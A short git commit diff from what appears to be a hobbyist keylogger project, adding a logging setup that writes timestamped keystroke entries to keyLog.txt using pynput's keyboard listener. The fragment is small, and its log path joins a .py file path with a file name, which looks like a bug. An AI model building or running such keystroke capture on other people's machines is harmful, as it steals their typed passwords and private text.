e37761f0b13ea0cd41a828b1f1da8b556c620ab4
sassanghz <sassanghazi@gmail.com>
2024-08-15 01:36:40 -0600

    log dir

--- pynput.py
+++ pynput.py
@@ -2,3 +2,5 @@ import pynput
 from pynput.keyboard import Key, Listener
 import logging
 
+log_dir = r"C:\Users\sassa\OneDrive\Documents\GitHub\KeyLogger\pynput.py"
+logging.basicConfig(filename= (log_dir + r"/keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
